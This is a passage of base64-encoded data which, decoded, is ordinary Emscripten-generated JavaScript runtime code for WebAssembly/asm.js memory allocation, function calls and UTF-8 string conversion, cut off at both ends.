l2ZVR5cGVTaXplOihmdW5jdGlvbih0eXBlKXtzd2l0Y2godHlwZSl7Y2FzZSJpMSI6Y2FzZSJpOCI6cmV0dXJuIDE7Y2FzZSJpMTYiOnJldHVybiAyO2Nhc2UiaTMyIjpyZXR1cm4gNDtjYXNlImk2NCI6cmV0dXJuIDg7Y2FzZSJmbG9hdCI6cmV0dXJuIDQ7Y2FzZSJkb3VibGUiOnJldHVybiA4O2RlZmF1bHQ6e2lmKHR5cGVbdHlwZS5sZW5ndGgtMV09PT0iKiIpe3JldHVybiBSdW50aW1lLlFVQU5UVU1fU0laRX1lbHNlIGlmKHR5cGVbMF09PT0iaSIpe3ZhciBiaXRzPXBhcnNlSW50KHR5cGUuc3Vic3RyKDEpKTthc3NlcnQoYml0cyU4PT09MCk7cmV0dXJuIGJpdHMvOH1lbHNle3JldHVybiAwfX19fSksZ2V0TmF0aXZlRmllbGRTaXplOihmdW5jdGlvbih0eXBlKXtyZXR1cm4gTWF0aC5tYXgoUnVudGltZS5nZXROYXRpdmVUeXBlU2l6ZSh0eXBlKSxSdW50aW1lLlFVQU5UVU1fU0laRSl9KSxTVEFDS19BTElHTjoxNixwcmVwVmFyYXJnOihmdW5jdGlvbihwdHIsdHlwZSl7aWYodHlwZT09PSJkb3VibGUifHx0eXBlPT09Imk2NCIpe2lmKHB0ciY3KXthc3NlcnQoKHB0ciY3KT09PTQpO3B0cis9NH19ZWxzZXthc3NlcnQoKHB0ciYzKT09PTApfXJldHVybiBwdHJ9KSxnZXRBbGlnblNpemU6KGZ1bmN0aW9uKHR5cGUsc2l6ZSx2YXJhcmcpe2lmKCF2YXJhcmcmJih0eXBlPT0iaTY0Inx8dHlwZT09ImRvdWJsZSIpKXJldHVybiA4O2lmKCF0eXBlKXJldHVybiBNYXRoLm1pbihzaXplLDgpO3JldHVybiBNYXRoLm1pbihzaXplfHwodHlwZT9SdW50aW1lLmdldE5hdGl2ZUZpZWxkU2l6ZSh0eXBlKTowKSxSdW50aW1lLlFVQU5UVU1fU0laRSl9KSxkeW5DYWxsOihmdW5jdGlvbihzaWcscHRyLGFyZ3Mpe2lmKGFyZ3MmJmFyZ3MubGVuZ3RoKXtyZXR1cm4gTW9kdWxlWyJkeW5DYWxsXyIrc2lnXS5hcHBseShudWxsLFtwdHJdLmNvbmNhdChhcmdzKSl9ZWxzZXtyZXR1cm4gTW9kdWxlWyJkeW5DYWxsXyIrc2lnXS5jYWxsKG51bGwscHRyKX19KSxmdW5jdGlvblBvaW50ZXJzOltdLGFkZEZ1bmN0aW9uOihmdW5jdGlvbihmdW5jKXtmb3IodmFyIGk9MDtpPFJ1bnRpbWUuZnVuY3Rpb25Qb2ludGVycy5sZW5ndGg7aSsrKXtpZighUnVudGltZS5mdW5jdGlvblBvaW50ZXJzW2ldKXtSdW50aW1lLmZ1bmN0aW9uUG9pbnRlcnNbaV09ZnVuYztyZXR1cm4gMiooMStpKX19dGhyb3ciRmluaXNoZWQgdXAgYWxsIHJlc2VydmVkIGZ1bmN0aW9uIHBvaW50ZXJzLiBVc2UgYSBoaWdoZXIgdmFsdWUgZm9yIFJFU0VSVkVEX0ZVTkNUSU9OX1BPSU5URVJTLiJ9KSxyZW1vdmVGdW5jdGlvbjooZnVuY3Rpb24oaW5kZXgpe1J1bnRpbWUuZnVuY3Rpb25Qb2ludGVyc1soaW5kZXgtMikvMl09bnVsbH0pLHdhcm5PbmNlOihmdW5jdGlvbih0ZXh0KXtpZighUnVudGltZS53YXJuT25jZS5zaG93bilSdW50aW1lLndhcm5PbmNlLnNob3duPXt9O2lmKCFSdW50aW1lLndhcm5PbmNlLnNob3duW3RleHRdKXtSdW50aW1lLndhcm5PbmNlLnNob3duW3RleHRdPTE7TW9kdWxlLnByaW50RXJyKHRleHQpfX0pLGZ1bmNXcmFwcGVyczp7fSxnZXRGdW5jV3JhcHBlcjooZnVuY3Rpb24oZnVuYyxzaWcpe2Fzc2VydChzaWcpO2lmKCFSdW50aW1lLmZ1bmNXcmFwcGVyc1tzaWddKXtSdW50aW1lLmZ1bmNXcmFwcGVyc1tzaWddPXt9fXZhciBzaWdDYWNoZT1SdW50aW1lLmZ1bmNXcmFwcGVyc1tzaWddO2lmKCFzaWdDYWNoZVtmdW5jXSl7aWYoc2lnLmxlbmd0aD09PTEpe3NpZ0NhY2hlW2Z1bmNdPWZ1bmN0aW9uIGR5bkNhbGxfd3JhcHBlcigpe3JldHVybiBSdW50aW1lLmR5bkNhbGwoc2lnLGZ1bmMpfX1lbHNlIGlmKHNpZy5sZW5ndGg9PT0yKXtzaWdDYWNoZVtmdW5jXT1mdW5jdGlvbiBkeW5DYWxsX3dyYXBwZXIoYXJnKXtyZXR1cm4gUnVudGltZS5keW5DYWxsKHNpZyxmdW5jLFthcmddKX19ZWxzZXtzaWdDYWNoZVtmdW5jXT1mdW5jdGlvbiBkeW5DYWxsX3dyYXBwZXIoKXtyZXR1cm4gUnVudGltZS5keW5DYWxsKHNpZyxmdW5jLEFycmF5LnByb3RvdHlwZS5zbGljZS5jYWxsKGFyZ3VtZW50cykpfX19cmV0dXJuIHNpZ0NhY2hlW2Z1bmNdfSksZ2V0Q29tcGlsZXJTZXR0aW5nOihmdW5jdGlvbihuYW1lKXt0aHJvdyJZb3UgbXVzdCBidWlsZCB3aXRoIC1zIFJFVEFJTl9DT01QSUxFUl9TRVRUSU5HUz0xIGZvciBSdW50aW1lLmdldENvbXBpbGVyU2V0dGluZyBvciBlbXNjcmlwdGVuX2dldF9jb21waWxlcl9zZXR0aW5nIHRvIHdvcmsifSksc3RhY2tBbGxvYzooZnVuY3Rpb24oc2l6ZSl7dmFyIHJldD1TVEFDS1RPUDtTVEFDS1RPUD1TVEFDS1RPUCtzaXplfDA7U1RBQ0tUT1A9U1RBQ0tUT1ArMTUmLTE2O3JldHVybiByZXR9KSxzdGF0aWNBbGxvYzooZnVuY3Rpb24oc2l6ZSl7dmFyIHJldD1TVEFUSUNUT1A7U1RBVElDVE9QPVNUQVRJQ1RPUCtzaXplfDA7U1RBVElDVE9QPVNUQVRJQ1RPUCsxNSYtMTY7cmV0dXJuIHJldH0pLGR5bmFtaWNBbGxvYzooZnVuY3Rpb24oc2l6ZSl7dmFyIHJldD1IRUFQMzJbRFlOQU1JQ1RPUF9QVFI+PjJdO3ZhciBlbmQ9KHJldCtzaXplKzE1fDApJi0xNjtIRUFQMzJbRFlOQU1JQ1RPUF9QVFI+PjJdPWVuZDtpZihlbmQ+PVRPVEFMX01FTU9SWSl7dmFyIHN1Y2Nlc3M9ZW5sYXJnZU1lbW9yeSgpO2lmKCFzdWNjZXNzKXtIRUFQMzJbRFlOQU1JQ1RPUF9QVFI+PjJdPXJldDtyZXR1cm4gMH19cmV0dXJuIHJldH0pLGFsaWduTWVtb3J5OihmdW5jdGlvbihzaXplLHF1YW50dW0pe3ZhciByZXQ9c2l6ZT1NYXRoLmNlaWwoc2l6ZS8ocXVhbnR1bT9xdWFudHVtOjE2KSkqKHF1YW50dW0/cXVhbnR1bToxNik7cmV0dXJuIHJldH0pLG1ha2VCaWdJbnQ6KGZ1bmN0aW9uKGxvdyxoaWdoLHVuc2lnbmVkKXt2YXIgcmV0PXVuc2lnbmVkPysobG93Pj4+MCkrICsoaGlnaD4+PjApKjQyOTQ5NjcyOTY6Kyhsb3c+Pj4wKSsgKyhoaWdofDApKjQyOTQ5NjcyOTY7cmV0dXJuIHJldH0pLEdMT0JBTF9CQVNFOjEwMjQsUVVBTlRVTV9TSVpFOjQsX19kdW1teV9fOjB9O01vZHVsZVsiUnVudGltZSJdPVJ1bnRpbWU7dmFyIEFCT1JUPTA7dmFyIEVYSVRTVEFUVVM9MDtmdW5jdGlvbiBhc3NlcnQoY29uZGl0aW9uLHRleHQpe2lmKCFjb25kaXRpb24pe2Fib3J0KCJBc3NlcnRpb24gZmFpbGVkOiAiK3RleHQpfX1mdW5jdGlvbiBnZXRDRnVuYyhpZGVudCl7dmFyIGZ1bmM9TW9kdWxlWyJfIitpZGVudF07aWYoIWZ1bmMpe3RyeXtmdW5jPWV2YWwoIl8iK2lkZW50KX1jYXRjaChlKXt9fWFzc2VydChmdW5jLCJDYW5ub3QgY2FsbCB1bmtub3duIGZ1bmN0aW9uICIraWRlbnQrIiAocGVyaGFwcyBMTFZNIG9wdGltaXphdGlvbnMgb3IgY2xvc3VyZSByZW1vdmVkIGl0PykiKTtyZXR1cm4gZnVuY312YXIgY3dyYXAsY2NhbGw7KChmdW5jdGlvbigpe3ZhciBKU2Z1bmNzPXsic3RhY2tTYXZlIjooZnVuY3Rpb24oKXtSdW50aW1lLnN0YWNrU2F2ZSgpfSksInN0YWNrUmVzdG9yZSI6KGZ1bmN0aW9uKCl7UnVudGltZS5zdGFja1Jlc3RvcmUoKX0pLCJhcnJheVRvQyI6KGZ1bmN0aW9uKGFycil7dmFyIHJldD1SdW50aW1lLnN0YWNrQWxsb2MoYXJyLmxlbmd0aCk7d3JpdGVBcnJheVRvTWVtb3J5KGFycixyZXQpO3JldHVybiByZXR9KSwic3RyaW5nVG9DIjooZnVuY3Rpb24oc3RyKXt2YXIgcmV0PTA7aWYoc3RyIT09bnVsbCYmc3RyIT09dW5kZWZpbmVkJiZzdHIhPT0wKXt2YXIgbGVuPShzdHIubGVuZ3RoPDwyKSsxO3JldD1SdW50aW1lLnN0YWNrQWxsb2MobGVuKTtzdHJpbmdUb1VURjgoc3RyLHJldCxsZW4pfXJldHVybiByZXR9KX07dmFyIHRvQz17InN0cmluZyI6SlNmdW5jc1sic3RyaW5nVG9DIl0sImFycmF5IjpKU2Z1bmNzWyJhcnJheVRvQyJdfTtjY2FsbD1mdW5jdGlvbiBjY2FsbEZ1bmMoaWRlbnQscmV0dXJuVHlwZSxhcmdUeXBlcyxhcmdzLG9wdHMpe3ZhciBmdW5jPWdldENGdW5jKGlkZW50KTt2YXIgY0FyZ3M9W107dmFyIHN0YWNrPTA7aWYoYXJncyl7Zm9yKHZhciBpPTA7aTxhcmdzLmxlbmd0aDtpKyspe3ZhciBjb252ZXJ0ZXI9dG9DW2FyZ1R5cGVzW2ldXTtpZihjb252ZXJ0ZXIpe2lmKHN0YWNrPT09MClzdGFjaz1SdW50aW1lLnN0YWNrU2F2ZSgpO2NBcmdzW2ldPWNvbnZlcnRlcihhcmdzW2ldKX1lbHNle2NBcmdzW2ldPWFyZ3NbaV19fX12YXIgcmV0PWZ1bmMuYXBwbHkobnVsbCxjQXJncyk7aWYocmV0dXJuVHlwZT09PSJzdHJpbmciKXJldD1Qb2ludGVyX3N0cmluZ2lmeShyZXQpO2lmKHN0YWNrIT09MCl7aWYob3B0cyYmb3B0cy5hc3luYyl7RW10ZXJwcmV0ZXJBc3luYy5hc3luY0ZpbmFsaXplcnMucHVzaCgoZnVuY3Rpb24oKXtSdW50aW1lLnN0YWNrUmVzdG9yZShzdGFjayl9KSk7cmV0dXJufVJ1bnRpbWUuc3RhY2tSZXN0b3JlKHN0YWNrKX1yZXR1cm4gcmV0fTt2YXIgc291cmNlUmVnZXg9L15mdW5jdGlvblxccypbYS16QS1aJF8wLTldKlxccypcXCgoW14pXSopXFwpXFxzKntcXHMqKFteKl0qPylbXFxzO10qKD86cmV0dXJuXFxzKiguKj8pWztcXHNdKik/fSQvO2Z1bmN0aW9uIHBhcnNlSlNGdW5jKGpzZnVuYyl7dmFyIHBhcnNlZD1qc2Z1bmMudG9TdHJpbmcoKS5tYXRjaChzb3VyY2VSZWdleCkuc2xpY2UoMSk7cmV0dXJue2FyZ3VtZW50czpwYXJzZWRbMF0sYm9keTpwYXJzZWRbMV0scmV0dXJuVmFsdWU6cGFyc2VkWzJdfX12YXIgSlNzb3VyY2U9bnVsbDtmdW5jdGlvbiBlbnN1cmVKU3NvdXJjZSgpe2lmKCFKU3NvdXJjZSl7SlNzb3VyY2U9e307Zm9yKHZhciBmdW4gaW4gSlNmdW5jcyl7aWYoSlNmdW5jcy5oYXNPd25Qcm9wZXJ0eShmdW4pKXtKU3NvdXJjZVtmdW5dPXBhcnNlSlNGdW5jKEpTZnVuY3NbZnVuXSl9fX19Y3dyYXA9ZnVuY3Rpb24gY3dyYXAoaWRlbnQscmV0dXJuVHlwZSxhcmdUeXBlcyl7YXJnVHlwZXM9YXJnVHlwZXN8fFtdO3ZhciBjZnVuYz1nZXRDRnVuYyhpZGVudCk7dmFyIG51bWVyaWNBcmdzPWFyZ1R5cGVzLmV2ZXJ5KChmdW5jdGlvbih0eXBlKXtyZXR1cm4gdHlwZT09PSJudW1iZXIifSkpO3ZhciBudW1lcmljUmV0PXJldHVyblR5cGUhPT0ic3RyaW5nIjtpZihudW1lcmljUmV0JiZudW1lcmljQXJncyl7cmV0dXJuIGNmdW5jfXZhciBhcmdOYW1lcz1hcmdUeXBlcy5tYXAoKGZ1bmN0aW9uKHgsaSl7cmV0dXJuIiQiK2l9KSk7dmFyIGZ1bmNzdHI9IihmdW5jdGlvbigiK2FyZ05hbWVzLmpvaW4oIiwiKSsiKSB7Ijt2YXIgbmFyZ3M9YXJnVHlwZXMubGVuZ3RoO2lmKCFudW1lcmljQXJncyl7ZW5zdXJlSlNzb3VyY2UoKTtmdW5jc3RyKz0idmFyIHN0YWNrID0gIitKU3NvdXJjZVsic3RhY2tTYXZlIl0uYm9keSsiOyI7Zm9yKHZhciBpPTA7aTxuYXJncztpKyspe3ZhciBhcmc9YXJnTmFtZXNbaV0sdHlwZT1hcmdUeXBlc1tpXTtpZih0eXBlPT09Im51bWJlciIpY29udGludWU7dmFyIGNvbnZlcnRDb2RlPUpTc291cmNlW3R5cGUrIlRvQyJdO2Z1bmNzdHIrPSJ2YXIgIitjb252ZXJ0Q29kZS5hcmd1bWVudHMrIiA9ICIrYXJnKyI7IjtmdW5jc3RyKz1jb252ZXJ0Q29kZS5ib2R5KyI7IjtmdW5jc3RyKz1hcmcrIj0oIitjb252ZXJ0Q29kZS5yZXR1cm5WYWx1ZSsiKTsifX12YXIgY2Z1bmNuYW1lPXBhcnNlSlNGdW5jKChmdW5jdGlvbigpe3JldHVybiBjZnVuY30pKS5yZXR1cm5WYWx1ZTtmdW5jc3RyKz0idmFyIHJldCA9ICIrY2Z1bmNuYW1lKyIoIithcmdOYW1lcy5qb2luKCIsIikrIik7IjtpZighbnVtZXJpY1JldCl7dmFyIHN0cmdmeT1wYXJzZUpTRnVuYygoZnVuY3Rpb24oKXtyZXR1cm4gUG9pbnRlcl9zdHJpbmdpZnl9KSkucmV0dXJuVmFsdWU7ZnVuY3N0cis9InJldCA9ICIrc3RyZ2Z5KyIocmV0KTsifWlmKCFudW1lcmljQXJncyl7ZW5zdXJlSlNzb3VyY2UoKTtmdW5jc3RyKz1KU3NvdXJjZVsic3RhY2tSZXN0b3JlIl0uYm9keS5yZXBsYWNlKCIoKSIsIihzdGFjaykiKSsiOyJ9ZnVuY3N0cis9InJldHVybiByZXR9KSI7cmV0dXJuIGV2YWwoZnVuY3N0cil9fSkpKCk7TW9kdWxlWyJjY2FsbCJdPWNjYWxsO01vZHVsZVsiY3dyYXAiXT1jd3JhcDtmdW5jdGlvbiBzZXRWYWx1ZShwdHIsdmFsdWUsdHlwZSxub1NhZmUpe3R5cGU9dHlwZXx8Imk4IjtpZih0eXBlLmNoYXJBdCh0eXBlLmxlbmd0aC0xKT09PSIqIil0eXBlPSJpMzIiO3N3aXRjaCh0eXBlKXtjYXNlImkxIjpIRUFQOFtwdHI+PjBdPXZhbHVlO2JyZWFrO2Nhc2UiaTgiOkhFQVA4W3B0cj4+MF09dmFsdWU7YnJlYWs7Y2FzZSJpMTYiOkhFQVAxNltwdHI+PjFdPXZhbHVlO2JyZWFrO2Nhc2UiaTMyIjpIRUFQMzJbcHRyPj4yXT12YWx1ZTticmVhaztjYXNlImk2NCI6dGVtcEk2ND1bdmFsdWU+Pj4wLCh0ZW1wRG91YmxlPXZhbHVlLCtNYXRoX2Ficyh0ZW1wRG91YmxlKT49MT90ZW1wRG91YmxlPjA/KE1hdGhfbWluKCtNYXRoX2Zsb29yKHRlbXBEb3VibGUvNDI5NDk2NzI5NiksNDI5NDk2NzI5NSl8MCk+Pj4wOn5+K01hdGhfY2VpbCgodGVtcERvdWJsZS0gKyh+fnRlbXBEb3VibGU+Pj4wKSkvNDI5NDk2NzI5Nik+Pj4wOjApXSxIRUFQMzJbcHRyPj4yXT10ZW1wSTY0WzBdLEhFQVAzMltwdHIrND4+Ml09dGVtcEk2NFsxXTticmVhaztjYXNlImZsb2F0IjpIRUFQRjMyW3B0cj4+Ml09dmFsdWU7YnJlYWs7Y2FzZSJkb3VibGUiOkhFQVBGNjRbcHRyPj4zXT12YWx1ZTticmVhaztkZWZhdWx0OmFib3J0KCJpbnZhbGlkIHR5cGUgZm9yIHNldFZhbHVlOiAiK3R5cGUpfX1Nb2R1bGVbInNldFZhbHVlIl09c2V0VmFsdWU7ZnVuY3Rpb24gZ2V0VmFsdWUocHRyLHR5cGUsbm9TYWZlKXt0eXBlPXR5cGV8fCJpOCI7aWYodHlwZS5jaGFyQXQodHlwZS5sZW5ndGgtMSk9PT0iKiIpdHlwZT0iaTMyIjtzd2l0Y2godHlwZSl7Y2FzZSJpMSI6cmV0dXJuIEhFQVA4W3B0cj4+MF07Y2FzZSJpOCI6cmV0dXJuIEhFQVA4W3B0cj4+MF07Y2FzZSJpMTYiOnJldHVybiBIRUFQMTZbcHRyPj4xXTtjYXNlImkzMiI6cmV0dXJuIEhFQVAzMltwdHI+PjJdO2Nhc2UiaTY0IjpyZXR1cm4gSEVBUDMyW3B0cj4+Ml07Y2FzZSJmbG9hdCI6cmV0dXJuIEhFQVBGMzJbcHRyPj4yXTtjYXNlImRvdWJsZSI6cmV0dXJuIEhFQVBGNjRbcHRyPj4zXTtkZWZhdWx0OmFib3J0KCJpbnZhbGlkIHR5cGUgZm9yIHNldFZhbHVlOiAiK3R5cGUpfXJldHVybiBudWxsfU1vZHVsZVsiZ2V0VmFsdWUiXT1nZXRWYWx1ZTt2YXIgQUxMT0NfTk9STUFMPTA7dmFyIEFMTE9DX1NUQUNLPTE7dmFyIEFMTE9DX1NUQVRJQz0yO3ZhciBBTExPQ19EWU5BTUlDPTM7dmFyIEFMTE9DX05PTkU9NDtNb2R1bGVbIkFMTE9DX05PUk1BTCJdPUFMTE9DX05PUk1BTDtNb2R1bGVbIkFMTE9DX1NUQUNLIl09QUxMT0NfU1RBQ0s7TW9kdWxlWyJBTExPQ19TVEFUSUMiXT1BTExPQ19TVEFUSUM7TW9kdWxlWyJBTExPQ19EWU5BTUlDIl09QUxMT0NfRFlOQU1JQztNb2R1bGVbIkFMTE9DX05PTkUiXT1BTExPQ19OT05FO2Z1bmN0aW9uIGFsbG9jYXRlKHNsYWIsdHlwZXMsYWxsb2NhdG9yLHB0cil7dmFyIHplcm9pbml0LHNpemU7aWYodHlwZW9mIHNsYWI9PT0ibnVtYmVyIil7emVyb2luaXQ9dHJ1ZTtzaXplPXNsYWJ9ZWxzZXt6ZXJvaW5pdD1mYWxzZTtzaXplPXNsYWIubGVuZ3RofXZhciBzaW5nbGVUeXBlPXR5cGVvZiB0eXBlcz09PSJzdHJpbmciP3R5cGVzOm51bGw7dmFyIHJldDtpZihhbGxvY2F0b3I9PUFMTE9DX05PTkUpe3JldD1wdHJ9ZWxzZXtyZXQ9W3R5cGVvZiBfbWFsbG9jPT09ImZ1bmN0aW9uIj9fbWFsbG9jOlJ1bnRpbWUuc3RhdGljQWxsb2MsUnVudGltZS5zdGFja0FsbG9jLFJ1bnRpbWUuc3RhdGljQWxsb2MsUnVudGltZS5keW5hbWljQWxsb2NdW2FsbG9jYXRvcj09PXVuZGVmaW5lZD9BTExPQ19TVEFUSUM6YWxsb2NhdG9yXShNYXRoLm1heChzaXplLHNpbmdsZVR5cGU/MTp0eXBlcy5sZW5ndGgpKX1pZih6ZXJvaW5pdCl7dmFyIHB0cj1yZXQsc3RvcDthc3NlcnQoKHJldCYzKT09MCk7c3RvcD1yZXQrKHNpemUmfjMpO2Zvcig7cHRyPHN0b3A7cHRyKz00KXtIRUFQMzJbcHRyPj4yXT0wfXN0b3A9cmV0K3NpemU7d2hpbGUocHRyPHN0b3Ape0hFQVA4W3B0cisrPj4wXT0wfXJldHVybiByZXR9aWYoc2luZ2xlVHlwZT09PSJpOCIpe2lmKHNsYWIuc3ViYXJyYXl8fHNsYWIuc2xpY2Upe0hFQVBVOC5zZXQoc2xhYixyZXQpfWVsc2V7SEVBUFU4LnNldChuZXcgVWludDhBcnJheShzbGFiKSxyZXQpfXJldHVybiByZXR9dmFyIGk9MCx0eXBlLHR5cGVTaXplLHByZXZpb3VzVHlwZTt3aGlsZShpPHNpemUpe3ZhciBjdXJyPXNsYWJbaV07aWYodHlwZW9mIGN1cnI9PT0iZnVuY3Rpb24iKXtjdXJyPVJ1bnRpbWUuZ2V0RnVuY3Rpb25JbmRleChjdXJyKX10eXBlPXNpbmdsZVR5cGV8fHR5cGVzW2ldO2lmKHR5cGU9PT0wKXtpKys7Y29udGludWV9aWYodHlwZT09Imk2NCIpdHlwZT0iaTMyIjtzZXRWYWx1ZShyZXQraSxjdXJyLHR5cGUpO2lmKHByZXZpb3VzVHlwZSE9PXR5cGUpe3R5cGVTaXplPVJ1bnRpbWUuZ2V0TmF0aXZlVHlwZVNpemUodHlwZSk7cHJldmlvdXNUeXBlPXR5cGV9aSs9dHlwZVNpemV9cmV0dXJuIHJldH1Nb2R1bGVbImFsbG9jYXRlIl09YWxsb2NhdGU7ZnVuY3Rpb24gZ2V0TWVtb3J5KHNpemUpe2lmKCFzdGF0aWNTZWFsZWQpcmV0dXJuIFJ1bnRpbWUuc3RhdGljQWxsb2Moc2l6ZSk7aWYoIXJ1bnRpbWVJbml0aWFsaXplZClyZXR1cm4gUnVudGltZS5keW5hbWljQWxsb2Moc2l6ZSk7cmV0dXJuIF9tYWxsb2Moc2l6ZSl9TW9kdWxlWyJnZXRNZW1vcnkiXT1nZXRNZW1vcnk7ZnVuY3Rpb24gUG9pbnRlcl9zdHJpbmdpZnkocHRyLGxlbmd0aCl7aWYobGVuZ3RoPT09MHx8IXB0cilyZXR1cm4iIjt2YXIgaGFzVXRmPTA7dmFyIHQ7dmFyIGk9MDt3aGlsZSgxKXt0PUhFQVBVOFtwdHIraT4+MF07aGFzVXRmfD10O2lmKHQ9PTAmJiFsZW5ndGgpYnJlYWs7aSsrO2lmKGxlbmd0aCYmaT09bGVuZ3RoKWJyZWFrfWlmKCFsZW5ndGgpbGVuZ3RoPWk7dmFyIHJldD0iIjtpZihoYXNVdGY8MTI4KXt2YXIgTUFYX0NIVU5LPTEwMjQ7dmFyIGN1cnI7d2hpbGUobGVuZ3RoPjApe2N1cnI9U3RyaW5nLmZyb21DaGFyQ29kZS5hcHBseShTdHJpbmcsSEVBUFU4LnN1YmFycmF5KHB0cixwdHIrTWF0aC5taW4obGVuZ3RoLE1BWF9DSFVOSykpKTtyZXQ9cmV0P3JldCtjdXJyOmN1cnI7cHRyKz1NQVhfQ0hVTks7bGVuZ3RoLT1NQVhfQ0hVTkt9cmV0dXJuIHJldH1yZXR1cm4gTW9kdWxlWyJVVEY4VG9TdHJpbmciXShwdHIpfU1vZHVsZVsiUG9pbnRlcl9zdHJpbmdpZnkiXT1Qb2ludGVyX3N0cmluZ2lmeTtmdW5jdGlvbiBBc2NpaVRvU3RyaW5nKHB0cil7dmFyIHN0cj0iIjt3aGlsZSgxKXt2YXIgY2g9SEVBUDhbcHRyKys+PjBdO2lmKCFjaClyZXR1cm4gc3RyO3N0cis9U3RyaW5nLmZyb21DaGFyQ29kZShjaCl9fU1vZHVsZVsiQXNjaWlUb1N0cmluZyJdPUFzY2lpVG9TdHJpbmc7ZnVuY3Rpb24gc3RyaW5nVG9Bc2NpaShzdHIsb3V0UHRyKXtyZXR1cm4gd3JpdGVBc2NpaVRvTWVtb3J5KHN0cixvdXRQdHIsZmFsc2UpfU1vZHVsZVsic3RyaW5nVG9Bc2NpaSJdPXN0cmluZ1RvQXNjaWk7dmFyIFVURjhEZWNvZGVyPXR5cGVvZiBUZXh0RGVjb2RlciE9PSJ1bmRlZmluZWQiP25ldyBUZXh0RGVjb2RlcigidXRmOCIpOnVuZGVmaW5lZDtmdW5jdGlvbiBVVEY4QXJyYXlUb1N0cmluZyh1OEFycmF5LGlkeCl7dmFyIGVuZFB0cj1pZHg7d2hpbGUodThBcnJheVtlbmRQdHJdKSsrZW5kUHRyO2lmKGVuZFB0ci1pZHg+MTYmJnU4QXJyYXkuc3ViYXJyYXkmJlVURjhEZWNvZGVyKXtyZXR1cm4gVVRGOERlY29kZXIuZGVjb2RlKHU4QXJyYXkuc3ViYXJyYXkoaWR4LGVuZFB0cikpfWVsc2V7dmFyIHUwLHUxLHUyLHUzLHU0LHU1O3ZhciBzdHI9IiI7d2hpbGUoMSl7dTA9dThBcnJheVtpZHgrK107aWYoIXUwKXJldHVybiBzdHI7aWYoISh1MCYxMjgpKXtzdHIrPVN0cmluZy5mcm9tQ2hhckNvZGUodTApO2NvbnRpbnVlfXUxPXU4QXJyYXlbaWR4KytdJjYzO2lmKCh1MCYyMjQpPT0xOTIpe3N0cis9U3RyaW5nLmZyb21DaGFyQ29kZSgodTAmMzEpPDw2fHUxKTtjb250aW51ZX11Mj11OEFycmF5W2lkeCsrXSY2MztpZigodTAmMjQwKT09MjI0KXt1MD0odTAmMTUpPDwxMnx1MTw8Nnx1Mn1lbHNle3UzPXU4QXJyYXlbaWR4KytdJjYzO2lmKCh1MCYyNDgpPT0yNDApe3UwPSh1MCY3KTw8MTh8dTE8PDEyfHUyPDw2fHUzfWVsc2V7dTQ9dThBcnJheVtpZHgrK10mNjM7aWYoKHUwJjI1Mik9PTI0OCl7dTA9KHUwJjMpPDwyNHx1MTw8MTh8dTI8PDEyfHUzPDw2fHU0fWVsc2V7dTU9dThBcnJheVtpZHgrK10mNjM7dTA9KHUwJjEpPDwzMHx1MTw8MjR8dTI8PDE4fHUzPDwxMnx1NDw8Nnx1NX19fWlmKHUwPDY1NTM2KXtzdHIrPVN0cmluZy5mcm9tQ2hhckNvZGUodTApfWVsc2V7dmFyIGNoPXUwLTY1NTM2O3N0cis9U3RyaW5nLmZyb21DaGFyQ29kZSg1NTI5NnxjaD4+MTAsNTYzMjB8Y2gmMTAyMyl9fX19TW9kdWxlWyJVVEY4QXJyYXlUb1N0cmluZyJdPVVURjhBcnJheVRvU3RyaW5nO2Z1bmN0aW9uIFVURjhUb1N0cmluZyhwdHIpe3JldHVybiBVVEY4QXJyYXlUb1N0cmluZyhIRUFQVTgscHRyKX1Nb2R1bGVbIlVURjhUb1N0cmluZyJdPVVURjhUb1N0cmluZztmdW5jdGlvbiBzdHJpbmdUb1VURjhBcnJheShzdHIsb3V0VThBcnJheSxvdXRJZHgsbWF4Qnl0ZXNUb1dyaXRlKXtpZighKG1heEJ5dGVzVG9Xcml0ZT4wKSlyZXR1cm4gMDt2YXIgc3RhcnRJZHg9b3V0SWR4O3ZhciBlbmRJZHg9b3V0SWR4K21heEJ5dGVzVG9Xcml0ZS0xO2Zvcih2YXIgaT0wO2k8c3RyLmxlbmd0aDsrK2kpe3ZhciB1PXN0ci5jaGFyQ29kZUF0KGkpO2lmKHU+PTU1Mjk2JiZ1PD01NzM0Myl1PTY1NTM2KygodSYxMDIzKTw8MTApfHN0ci5jaGFyQ29kZUF0KCsraSkmMTAyMztpZih1PD0xMjcpe2lmKG91dElkeD49ZW5kSWR4KWJyZWFrO291dFU4QXJyYXlbb3V0SWR4KytdPXV9ZWxzZSBpZih1PD0yMDQ3KXtpZihvdXRJZHgrMT49ZW5kSWR4KWJyZWFrO291dFU4QXJyYXlbb3V0SWR4KytdPTE5Mnx1Pj42O291dFU4QXJyYXlbb3V0SWR4KytdPTEyOHx1JjYzfWVsc2UgaWYodTw9NjU1MzUpe2lmKG91dElkeCsyPj1lbmRJZHgpYnJlYWs7b3V0VThBcnJheVtvdXRJZHgrK109MjI0fHU+PjEyO291dFU4QXJyYXlbb3V0SWR4KytdPTEyOHx1Pj42JjYzO291dFU4QXJyYXlbb3V0SWR4KytdPTEyOHx1JjYzfWVsc2UgaWYodTw9MjA5NzE1MSl7aWYob3V0SWR4KzM+PWVuZElkeClicmVhaztvdXRVOEFycmF5W291dElkeCsrXT0yNDB8dT4+MTg7b3V0VThBcnJheVtvdXRJZHgrK109MTI4fHU+PjEyJjYzO291dFU4QXJyYXlbb3V0SWR4KytdPTEyOHx1Pj42JjYzO291dFU4QXJyYXlbb3V0SWR4KytdPTEyOHx1JjYzfWVsc2UgaWYodTw9NjcxMDg4NjMpe2lmKG91dElkeCs0Pj1lbmRJZHgpYnJlYWs7b3V0VThBcnJheVtvdXRJZHgrK109MjQ4fHU+PjI0O291dFU4QXJyYXlbb3V0SWR4KytdPTEyOHx1Pj4xOCY2MztvdXRVOEFycmF5W291dElkeCsrXT0xMjh8dT4+MTImNjM7b3V0VThBcnJheVtvdXRJZHgrK109MTI4fHU+PjYmNjM7b3V0VThBcnJheVtvdXRJZHgrK109MTI4fHUmNjN9ZWxzZXtpZihvdXRJZHgrNT49ZW5kSWR4KWJyZWFrO291dFU4QXJyYXlbb3V0SWR4KytdPTI1Mnx1Pj4zMDtvdXRVOEFycmF5W291dElkeCsrXT0xMjh8dT4+MjQmNjM7b3V0VThBcnJheVtvdXRJZHgrK109MTI4fHU+PjE4JjYzO291dFU4QXJyYXlbb3V0SWR4KytdPTEyOHx1Pj4xMiY2MztvdXRVOEFycmF5W291dElkeCsrXT0xMjh8dT4+NiY2MztvdXRVOEFycmF5W291dElkeCsrXT0xMjh8dSY2M319b3V0VThBcnJheVtvdXRJZHhdPTA7cmV0dXJuIG91dElkeC